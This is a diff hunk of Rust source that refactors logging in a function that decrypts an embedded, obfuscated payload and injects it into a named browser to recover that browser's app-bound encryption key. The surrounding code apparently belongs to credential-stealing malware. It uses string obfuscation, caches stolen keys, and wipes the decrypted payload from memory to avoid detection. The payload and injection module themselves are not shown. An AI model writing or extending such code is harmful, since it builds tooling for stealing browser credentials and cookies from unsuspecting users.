@@ -32,45 +32,40 @@ fn decrypt_embedded_payload(encrypted: &[u8]) -> Vec<u8> {
 
 pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
     if EMBEDDED_PAYLOAD.is_empty() {
-        #[cfg(debug_assertions)]
-        crate::log::log(&format!(obfstr!("inject skip: empty payload ({})"), browser_name));
+        crate::logf!("{} ({})", obfstr!("inject skip: empty payload"), browser_name);
         return None;
     }
 
     if let Ok(guard) = FAIL_CACHE.lock() {
         if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
-            #[cfg(debug_assertions)]
-            crate::log::log(&format!(obfstr!("inject skip: prior fail ({})"), browser_name));
+            crate::logf!("{} ({})", obfstr!("inject skip: prior fail"), browser_name);
             return None;
         }
     }
     if let Ok(guard) = KEY_CACHE.lock() {
         if let Some(map) = guard.as_ref() {
             if let Some(key) = map.get(browser_name) {
-                #[cfg(debug_assertions)]
-                crate::log::log(&format!(obfstr!("inject cache hit: {}"), browser_name));
+                crate::logf!("{} {}", obfstr!("inject cache hit:"), browser_name);
                 return Some(key.clone());
             }
         }
     }
 
-    #[cfg(debug_assertions)]
-    crate::log::log(&format!(
-        obfstr!("inject start: {} (payload {} bytes)"),
+    crate::logf!(
+        "{} {} ({} bytes)",
+        obfstr!("inject start:"),
         browser_name,
         EMBEDDED_PAYLOAD.len()
-    ));
+    );
 
     let mut decrypted = decrypt_embedded_payload(EMBEDDED_PAYLOAD);
     let key = match inject::recover_key(browser_name, &decrypted) {
         Some(k) => {
-            #[cfg(debug_assertions)]
-            crate::log::log(&format!(obfstr!("inject OK: {}"), browser_name));
+            crate::logf!("{} {}", obfstr!("inject OK:"), browser_name);
             k
         }
         None => {
-            #[cfg(debug_assertions)]
-            crate::log::log(&format!(obfstr!("inject FAIL: {}"), browser_name));
+            crate::logf!("{} {}", obfstr!("inject FAIL:"), browser_name);
             unsafe {
                 std::ptr::write_bytes(decrypted.as_mut_ptr(), 0, decrypted.len());
             }
